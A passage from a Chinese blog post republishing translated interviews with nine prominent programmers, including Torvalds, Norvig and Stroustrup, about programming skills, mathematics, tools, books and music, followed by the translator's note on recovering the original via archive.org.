<p>哦，这并不只是唯一的事。还有一件事，尤其在开源项目里，那是他是否有能力能和别人进行简单的沟通，告诉别人他要干什么，怎么干。这个能力可以告诉别人为什么你干的事是非常重要的，并不是所有的人都有这个能力。</p>
<p>也就是说，有一些人可以写出很不错的代码，但他们并不一定能解释这些代码，他们也并不一定有好的品味，但是代码可以运行得不错。有时，你需要另一个人（有那种不错的品味的人）把他的代码转成更好的形式。也就是说，任何一个程序员都需要那种可以用清晰的代码来解决复杂问题的基础能力。</p>
<p><strong><em>David Heinemeier Hansson</em></strong></p>
<p>很强的对有价值的事的感觉。你可以问问自己这个问题你有没有这种能力：我现在做的这个事值不值得做？很多程序员浪费了如大海一样的时间去做一些无意义的事。</p>
<p><strong><em>Peter Norvig</em></strong></p>
<p>我不觉得只有一个，如果要我说一个的话，我说是“专注”。</p>
<p><strong><em>Dave Thomas</em></strong></p>
<p>热情。</p>
<p><strong><em>Guido Van Rossum</em></strong></p>
<p>你的问题很难回答啊:-) 我猜，如果程序员会在早晨煎个鸡蛋做早餐，那真是无价的能力。</p>
<p><strong><em>James Gosling</em></strong></p>
<p>自我激发。你需要全身心地投入到你要做的事中。</p>
<p><strong><em>Bjarne Stroustrup</em></strong></p>
<p>把事想清楚的能力：程序必需要能清楚地理解问题并能清楚地表述解决方案。</p>
<p><strong><em>Tim Bray</em></strong></p>
<p>能为自己的直觉提供证据的能力。</p>
<h4>Q 3: 你是否认为数学和/或物理是一种很重要的编程技能？为什么？</h4>
<p><strong><em>Steve Yegge</em></strong></p>
<p>数学有很多的分支和程序员相关，他们是“离散数学”和“具体数学”。这些分支包括的学科有，概率论，组合数学，图论，归纳证明，和其它有用的东西。我会鼓励所有的程序员都去学习离散数学，无论能学多少，因为这总比什么都不懂强。</p>
<p>对于传统的数学，我也不经常用，但是我需要的时候这些数学知识会很管用。例如，在我之前的工作中我就用到了微积分。我需要估计每个小时中某服务的高峰时间的流量负载，所以，他的负载是跟着太阳走的就像一个正弦曲线一样。最简单的方式就是把每个小时的负载曲线给整合起来。如果我不知道微积分，我就不知道怎么更为准确地估计。</p>
<p>当年我在开发我的Wyvern游戏的时候，我的平面几何的知识对我非常有帮助。而且经常使用代数和线性代数的知识。但我很少在工作中使用三角学或微分方程，微积分同样也很少。</p>
<p>我想说，简单的数学基础让我的技能比一般程序员好过5%到10%。如果我了解更多的数学，我确信我会比今天做得更好，所以，我每周都会花几个小时学习数学。</p>
<p>我喜欢物理，我还在学习物理，我会花我一生去理解量子力学。但是我个却没有发现物理对我的程序员工作有多有用。当然，如果我从事一些和物理相关的工作，可能会有用，例如：3D游戏编程，或是某种物理特性仿真。</p>
<p><strong><em>Linus Torvalds</em></strong></p>
<p>我个人认为有很强的数学背景是一件好事。但我不确信物理是不是这样的，但是我深信懂数学的人会让你成为一个更好的程序员。这些智力模型都是相通的。</p>
<p><strong><em>David Heinemeier Hansson</em></strong></p>
<p>根本没用。至少对业务编程和Web应用来说没用。但是数学可能对一个人的写作有很重要的帮助。</p>
<p><strong><em>Peter Norvig</em></strong></p>
<p>是的。很多相法都是从数学来的：归纳，递归，逻辑，等等。</p>
<p><strong><em>Dave Thomas</em></strong></p>
<p>也许吧。但老实说，我没见到过懂这些学科和好的程序员有很大的相关性。</p>
<p>然而，我见过有音乐背景和好的编程技能有很强的相关性。我不知道这为什么，但是我怀疑大脑中的某个区域可以让人即可以写出好的音乐，也可以写出好的代码。（陈皓注：<em><a href="http://www.weibo.com/n/Sir%E9%98%BF%E6%80%AA">@Sir阿怪</a> </em>貌似就是这个例子）</p>
<p><strong><em>Guido Van Rossum</em></strong></p>
<p>数学，当然（对于一些学科是很重要的，我不关心微分方程，但是代数和逻辑学是很重要的），物理，我不觉得对编程技能有关，当然物理在其它很多地方很有意思。</p>
<p><strong><em>James Gosling</em></strong></p>
<p>当然！数学教会了我逻辑和推导……让我有了一双懂分析的眼睛。当我们分析算法的时候，数学是无法被取代的。</p>
<p><strong><em>Bjarne Stroustrup</em></strong></p>
<p>这要看程序员自己和项目性质了。以前的数学很有用，物理一般，但是学好物理是是学习应用数学最好的一条路。</p>
<p><strong><em>Tim Bray</em></strong></p>
<p>对我来说，在我的编程生涯中我从来都没有用过大学里教的数学。</p>
<h4>Q 4: 关于编程，你们认为接下来的大事是什么？X-Oriented编程，Y语言，量子电脑 ？</h4>
<p><strong><em>Steve Yegge</em></strong></p>
<p>我认为Web编程会逐渐变成最最重要的客户端编程。而对于原来传统的客端端编程都会被废弃，如： GTK, Java Swing/SWT, Qt, 当然，所有的和平台有关的东西，例如 Cocoa 和 Win32/MFC/等。</p>
<p>当然，这不会一晚上就发生了。这会在第一个十年内缓慢地发生，而在第二个十年内，Web Apps最终会胜利。工具，语言，协议，和浏览器技术都会进步得非常快，并会完全超出你今天能干的事。每一年都会向前进一步，而从今天开始，我会最终决定把我所有的应用开发全部切换到基于浏览器的应用。（陈皓注：我也是这么认为的，参看《<a title="来信， 创业 和 移动互联网" href="https://coolshell.cn/articles/5815.html">来信，创业，移动互联网</a>》）</p>
<p>微软和苹果最终不愿意这个事发生，所以，触发这个事的第一步会是一个开源的浏览器（如：Firefox）开始到了支配市场的地位，然后会出现某种Firefox的杀手级应用（这种杀手级应用可能会像iTunes一样，所有的人都会用它，只需要下载Firefox）</p>
<p><strong><em>Linus Torvalds</em></strong></p>
<p>我并不认为我们会看到一个“大的跳跃”。我们只会看到很多的工作帮助我们把那些沉闷辛苦的工作变得更简单——会有一个更高级别的语言，也许把简单的数据库集成到语言中来会是其中最主要一个。</p>
<p>例如，我个人相信“Visual Basic”在编程方面比“面向对象”做得更多。当然，人们都在取笑VB是一个很烂的编程语言，并且人们在谈论OO语言都十多年了。但我还觉得不是这样的，Visual Basic 不是一个好的语言，但是我觉得VB那简单的数据库接口比OO更重要。</p>
<p>所以，我认为会语言有很多的改进，并且，硬件的改进会让编程更容易，但我并不期望会有巨大的生产力或是革命性的改进。</p>
<p>至少，你不会开始搞真正的AI的东西，我也不认为真的AI会变成某种你不需要编程的东西。</p>
<p><strong><em>David Heinemeier Hansson</em></strong></p>
<p>我从不试图预测未来。我也不相信命运一说。最好预测未来的方式就是去实现未来。</p>
<p><strong><em>Peter Norvig</em></strong></p>
<p>大规模的分布式处理</p>
<p><strong><em>Dave Thomas</em></strong></p>
<p>下一个最牛的事会被再下一个最牛的事所掩盖，然后再被再再下一个所掩盖，再再再下一个所掩盖……。这是一件没完没了的事，所以，我并不会试图去找最牛的事，因为这会让人们忘了那些最真实的问题：把基本的东西做对。我们要让用户更满意，专注于交付有价值的东西，自豪于我们做的事。一个程序员可以使用很多工具把这些事做得更好，而不是去追逐时尚和流行。</p>
<p><strong><em>Guido Van Rossum</em></strong></p>
<p>对不起，我没有那么多水晶球。我CGI被发明了5年后预测过它 :-)</p>
<p><strong><em>James Gosling</em></strong></p>
<p>有两个事是我现在最关心的，那就是要对付并行和复杂。</p>
<p><strong><em>Bjarne Stroustrup</em></strong></p>
<p>我不知道，我也不愿猜。</p>
<p><strong><em>Tim Bray</em></strong></p>
<p>不知道。</p>
<h4>Q 5: 如果你有3个月学一个相对较新的技术，你会学什么？</h4>
<p><strong><em>Steve Yegge</em></strong></p>
<p>我的确有3个月的业余时间，我准备学一下 Dojo (<a href="http://dojotoolkit.org" target="_blank">http://dojotoolkit.org</a>) 和高级 AJAX 及 DHTML。我会通过开发一个相当牛的Web应用来学习他们。Dojo 真的酷，并且我确信它会越来越好。</p>
<p><strong><em>Linus Torvalds</em></strong></p>
<p>嗯，我真的很爱做 FPGA（可编程芯片），但我部是太忙了而不是坐来来开始学习。我喜爱和硬件打交道：很明显这个原因是因为我最终在做操作系统，因为操作系统（除了编译器）基本上都是在和硬件打交道，但我没有真正地自己去设计和做一个硬件。</p>
<p><strong><em>David Heinemeier Hansson</em></strong></p>
<p>Mac 的 Cocoa 编程</p>
<p><strong><em>Peter Norvig</em></strong></p>
<p>我想把 Javascript 学得更好，<del>然也</del>当然也想学 flash.</p>
<p><strong><em>Dave Thomas</em></strong></p>
<p>如果“新”是对于我来说，那么我会去学钢琴课。</p>
<p>如果“新”是说技术，我猜 我会选择学习某种和为残疾人服务的有关的技术。</p>
<p><strong><em>Guido Van Rossum</em></strong></p>
<p>单板滑雪。</p>
<p><strong><em>James Gosling</em></strong></p>
<p>搞点有乐趣的东西，我会学习最新的3D渲染技术。我可能会写一个光子映射渲染器。</p>
<p><strong><em>Bjarne Stroustrup</em></strong></p>
<p>3个月只有很少的东西你可以学，我觉得你只能参加某个成熟领域的培训。</p>
<p><strong><em>Tim Bray</em></strong></p>
<p>安全，加密，数字签名，身份标识，等等。对我来说，从没学过这些东西对我来说是个很大的问题。</p>
<h4>Q 6: 你们觉得如何让一些程序员可能有超过其它程序员10倍或100倍的生产力？</h4>
<p><strong><em>Steve Yegge</em></strong></p>
<p>我想你应该考虑一下为什么不是让所有的程序员都一样牛。托马斯爱迪生有一句关于天才的名言也许会给你一些启示。</p>
<p><strong><em>Linus Torvalds</em></strong></p>
<p>我真的不知道，我想，一些人之所以更牛是因为他们可以专注于那些重要的事，而更多的只不过是在应付。那些我所知道的真的很牛的程序员从很年轻的时候就在做事了。</p>
<p><strong><em>David Heinemeier Hansson</em></strong></p>
<p>把难题变简单的能力。</p>
<p><strong><em>Peter Norvig</em></strong></p>
<p>把整体问题一次性放入大脑的能力。</p>
<p><strong><em>Dave Thomas</em></strong></p>
<p>他们关心他们做的事。</p>
<p><strong><em>Guido Van Rossum</em></strong></p>
<p>大脑结构基因不同。</p>
<p><strong><em>James Gosling</em></strong></p>
<p>他们知道他们要做什么，他们不并不急于仓促行事。他们有他们要做的事的整个蓝图。</p>
<p><strong><em>Bjarne Stroustrup</em></strong></p>
<p>首先，缺少足够的职业培训，或基础不够。其次，这些人要即聪明（那种可以把事情想清楚，直达核心的能力），又有经验，并有使用工具的知识。编程需要把理论和实践结合起来 &#8211; 并不是使用没有实际业务的知识。</p>
<p><strong><em>Tim Bray</em></strong></p>
<p>令人惊讶的思维改变。</p>
<h4>Q 7: 什么工具是你的最爱（操作系统，编程/脚本语言，文本编辑器，版本管理，shell，数据库，或其它没它你活不了的工具），为什么不是别的？</h4>
<p><strong><em>Steve Yegge</em></strong></p>
<p>操作系统： Unix! 我用Linux，cygwin，和 darwin。你无法打败那些高效的工具。每一个程序员都应该学习使用/bin和/usr/bin下的所有命令。</p>
<p>脚本语言：Ruby。我几乎对所有的重要的脚本语言都很熟悉： Perl, Python, Tcl, Lua, Awk, Bash, 和一些我忘了的。但是我太懒了，而Ruby是目前所有脚本语言中最简单的，它应该是天堂制造的。</p>
<p>编程语言：没有一个我喜欢的，我觉得所有的编程语言都很扯。我倾向于Java，因为它很强，可跨平台，有多不错的工具和类库。但是Java未来会进化或是灭亡，Java还没有好到可以永远保持其领先地位。</p>
<p>文本编辑器：Emacs，因为这是迄今最好的编辑器。</p>
<p>版本管理：SVN，Perforce更好一些，但是也很贵。</p>
<p>Shell脚本： Bash, 因为我太懒了去学一个更好的。</p>
<p>数据库： 当然是MySQL，没有之一。</p>
<p>其它：我发现GIMP是无价的，但也是令人恼<del>炎</del>火的。我用这个东西好几年了，但什么也没干，但是我没它活不了。很讽刺吧。Firefox 越来越是我最重要的工具。如果让我去用IE和Safari，我会有严重的窒息感。</p>
<p>注：所有的这些工具 (Unix, Emacs, Firefox, GIMP, MySQL, Bash, SVN, Perforce) 都有一个共同点：他们是可扩展的。例如：他们都有可编程的API。伟大的程序员知道怎么编写他们的工具，而不只是去使用。</p>
<p><strong><em>Linus Torvalds</em></strong></p>
<p>实际上，我最终也没有用过几个工具，而我却花了一些时间让这些工具为我工作。最大的事是我自己写了个操作系统，我也自己写了个版本管理系统（git），我用的文本编辑器是 micro-emacs &#8211; 最终我也定制和扩展了它。</p>
<p>除了上面三个，其它的东西，我深度关心我的邮件阅读软件，我使用“pine”，并不是因为它是史上最好的邮件阅读软件，因为我习惯了，用它我会有最低限度的大惊小怪。</p>
<p><strong><em>David Heinemeier Hansson</em></strong></p>
<p>OS X, TextMate, Ruby, Subversion, MySQL. 这些组合让我很快乐。我希望那些有好的品味的专注于重要的事的工具。</p>
<p><strong><em>Peter Norvig</em></strong></p>
<p>我不喜欢那三大操作系统 &#8211; Windows, Mac, Linux。我喜欢 Python 和 Lisp. Emacs.</p>
<p><strong><em>Dave Thomas</em></strong></p>
<p>在使用Linux10年后我转到Mac平台有两年多了。Mac并不见得有多好，但是它不需要很牛的技术，也不需要经常维护，这让我可以让我更专心得使用它。</p>
<p>我并不是一个单一工具的信仰者，我喜欢换来换去的，这样可以让我有更多的经历。现在，我使用 OSX, Emacs, TextMate, Rails, Ruby, SVN, CVS, Rake, make, xsltproc, TeX, MySQL, Postgres, 还有一堆高效的小工具。没人知道我明年会用什么。</p>
<p><strong><em>Guido Van Rossum</em></strong></p>
<p>Unix/Linux, Python, vi+emacs, Firefox.</p>
<p><strong><em>James Gosling</em></strong></p>
<p>这些天，我在用 NetBeans. 用它可以干我想干的所有的事，清洁，简单和高效。这是最好的我永远要生活在其中的环境了。</p>
<p><strong><em>Bjarne Stroustrup</em></strong></p>
<p>Unix, sam (一个非常简单的文本编辑器), 当然，一个好的C++编译器。</p>
<p><strong><em>Tim Bray</em></strong></p>
<p>我喜欢 Unix-like 的操作系统，像 Python 和 Ruby 的动态语言，像Java的静态语言（具体说来是Java API） Emacs, 还有, bash, whatever, NetBeans.</p>
<h4>Q 8: 你最喜欢的编程书是什么？</h4>
<p><strong><em>Steve Yegge</em></strong></p>
<p>大哥，这个问题太难了。也许是&#8221;Gödel, Escher, Bach: an Eternal Golden Braid&#8221; (作者Hofstadter)？虽然这不是严格意义上的编程的书，如果你要明确意义上的编程书，那么可能是 SICP (mitpress.mit.edu).</p>
<p><strong><em>Linus Torvalds</em></strong></p>
<p>嗨。这两天我在读一些小说，或是非计算机读物（老的但是有用的 &#8220;The Selfish Gene&#8221; 作者 Richard Dawkins)。</p>
<p>如果要问我编程的书，我脑子里只出现了唯 一一本真正的经典的编程的书 Kernighan &amp; Ritchie 的 &#8220;The C Programming Language&#8221;，因为这本书太牛了，可读性强并且很短。考<del>虚</del>虑一下你想学到这世上一门最重要编程语言，并且它很要很薄，而且还有可读性，这真是一个奇迹。</p>
<p>也就是说，其它我很喜欢的书并不是编程的，而是关于计算机结构和硬件的。那显然是 Patterson &amp; Hennessy 的计算机结构的书，但是我个人也许更喜欢 Crawford &amp; Gelsinger 的 &#8220;Programming the 80386?，这是我在开始写Linux时用的书。</p>
<p>相似的原因，我还喜欢 Andrew Tanenbaum 的 &#8220;Operating Systems: Design and Implementation&#8221;.</p>
<p><strong><em>David Heinemeier Hansson</em></strong></p>
<p>我喜欢 Extreme Programming Explained 其摒弃了一般的编程实践，我还喜欢 Patterns of Enterprise Application Architecture 其出众地说明了抽象和具现的平衡。</p>
<p><strong><em>Peter Norvig</em></strong></p>
<p>Structure and Interpretation of Computer Programs</p>
<p><strong><em>Dave Thomas</em></strong></p>
<p>这关系到你所谓的“最喜欢”，也许我最喜欢的是IBM的 &#8220;IBM/360 Principles of Operation.&#8221;</p>
<p><strong><em>Guido Van Rossum</em></strong></p>
<p>Neil Stephenson的 Quicksilver.</p>
<p><strong><em>James Gosling</em></strong></p>
<p>Programming Pearls 作者Jon Bentley.</p>
<p><em><strong>Bjarne Stroustrup</strong></em></p>
<p>K&amp;R.</p>
<p><strong><em>Tim Bray</em></strong></p>
<p>Bentley的 Programming Pearls</p>
<h4>Q 9: 你最喜欢的和编程无关的一本书是什么？</h4>
<p><strong><em>Steve Yegge</em></strong></p>
<p>只能是一本吗？这不可能。有太多太多我喜欢的书了。</p>
<p>我这个月读过最喜欢的书是 &#8220;Stardust&#8221; (Neil Gaiman) 和 &#8220;The Mind’s I&#8221; (Hofstadter/Dennet).</p>
<p>我最喜欢的作者是 Kurt Vonnegut, Jr. 和 Jack Vance.</p>
<p><strong><em>Linus Torvalds</em></strong></p>
<p>我在前面说过 Dawkins的 Selfish Gene。在小说方面，有很多很多我enjoy的，但是几乎没有我特别喜欢的一本。我一般不会重读一本书，我的选择总是会变。我可能更喜欢科幻小说，如：&#8221;Stranger in a Strange Land&#8221; 作者 Heinlein，这是我青少年时期最喜欢的书，但现在并不是我喜欢的了。</p>
<p><strong><em>David Heinemeier Hansson</em></strong></p>
<p>1984, George Orwell.</p>
<p><strong><em>Guido Van Rossum</em></strong></p>
<p>Neil Stephenson 的 Quicksilver.</p>
<p><strong><em>James Gosling</em></strong></p>
<p>Guns, Germs &amp; Steel 作者 Jared Diamond</p>
<p><strong><em>Bjarne Stroustrup</em></strong></p>
<p>我没有固定喜欢的书。目前是 O’Brian 的 Aubrey/Maturin 系列。</p>
<p><strong><em>Tim Bray</em></strong></p>
<p>One Day in the Life of Ivan Denisovich</p>
<h4>Q 10: 你最喜欢的乐队/演奏家/作曲家？</h4>
<p><strong><em>Steve Yegge</em></strong></p>
<p>喜欢的风格：古典音乐，动漫原声音乐，电脑游戏音乐</p>
<p>喜欢的作曲家：Rachmaninoff, Chopin, Bach</p>
<p>喜欢的演奏者：David Russell (古典吉它), Sviatoslav Richter (钢琴)</p>
<p>喜欢的动漫音乐： Last Exile, Haibane Renmei</p>
<p><strong><em>Linus Torvalds</em></strong></p>
<p>实际上我并不太喜欢音乐，但是当我听音乐的时候，我一般听经典摇滚乐，如： Pink Floyd ，Beatles ，Queen 和 The Who 乐队。</p>
<p><strong><em>David Heinemeier Hansson</em></strong></p>
<p>我喜欢很多风格。 Beth Orton, Aimee Mann, Jewel, Lauryn Hill. Actually, 所有的这些都可以归到 Girls with Guitars ;).</p>
<p><strong><em>Guido Van Rossum</em></strong></p>
<p>Philip Glass.</p>
<p><strong><em>James Gosling</em></strong></p>
<p>我喜欢听民歌: Christine Lavin, Woody Guthrie, Pete Seeger&#8230;</p>
<p><strong><em>Bjarne Stroustrup</em></strong></p>
<p>乐队: The Dixie Chicks. 作曲家: Beethoven.</p>
<p><strong><em>Tim Bray</em></strong></p>
<p>看我的博客吧。</p>
<p>. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
<p>. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</p>
<h4><strong> 补充说明</strong></h4>
<p>我之所以发现这篇文章，是因为我读到了 Jeff Atwood 的这篇名为 &#8220;<a href="http://www.codinghorror.com/blog/2006/07/linus-torvalds-visual-basic-fan.html">Linus Torvalds, Visual Basic Fan</a>&#8221; 的文章，这篇文章指向了 &#8220;<a href="http://sztywny.titaniumhosting.com/2006/07/23/stiff-asks-great-programmers-answers/">STIFF ASKS, GREAT PROGRAMMERS ANSWER</a>&#8221; 这篇文章，但是链接已坏了，然后，我搜了一下也没有搜到这篇文章。然后我去了 archive.org 搜了一下，并找到了这篇由 Jaroslaw Rzeszótko 写的博客。</p>
<p>因为这篇博文现在找不到了，所以，我想我应该重新把它贴出来，这样其它人可以读一下这篇有意思的文章。所以，我向原作者取得了授权，再次感谢 Jaroslaw!</p>
<p>（全文完）<!--



<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>





<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>

 

--></p>
<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>

<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/22298.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/10/communication-150x150.png" alt="聊聊团队协同和协同工具" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22298.html" class="wp_rp_title">聊聊团队协同和协同工具</a></li><li ><a href="https://coolshell.cn/articles/22173.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/02/http_method-150x150.png" alt="“一把梭：REST API 全用 POST”" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22173.html" class="wp_rp_title">“一把梭：REST API 全用 POST”</a></li><li ><a href="https://coolshell.cn/articles/22157.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/02/monitoring-150x150.jpeg" alt="谈谈公司对员工的监控" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22157.html" class="wp_rp_title">谈谈公司对员工的监控</a></li><li ><a href="https://coolshell.cn/articles/21589.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2021/07/knowledge_sharing-300x169-1-150x150.jpeg" alt="如何做一个有质量的技术分享" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21589.html" class="wp_rp_title">如何做一个有质量的技术分享</a></li><li ><a href="https://coolshell.cn/articles/20977.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/08/programmer.01-e1596792460687-150x150.png" alt="程序员如何把控自己的职业" width="150" height="150" /></a><a href="https://coolshell.cn/articles/20977.html" class="wp_rp_title">程序员如何把控自己的职业</a></li><li ><a href="https://coolshell.cn/articles/20765.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/01/remote-150x150.jpg" alt="MegaEase的远程工作文化" width="150" height="150" /></a><a href="https://coolshell.cn/articles/20765.html" class="wp_rp_title">MegaEase的远程工作文化</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/8275.html">对九个超级程序员的采访</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
					
					<wfw:commentRss>https://coolshell.cn/articles/8275.html/feed</wfw:commentRss>
			<slash:comments>70</slash:comments>
		
		
			</item>
	</channel>
</rss>
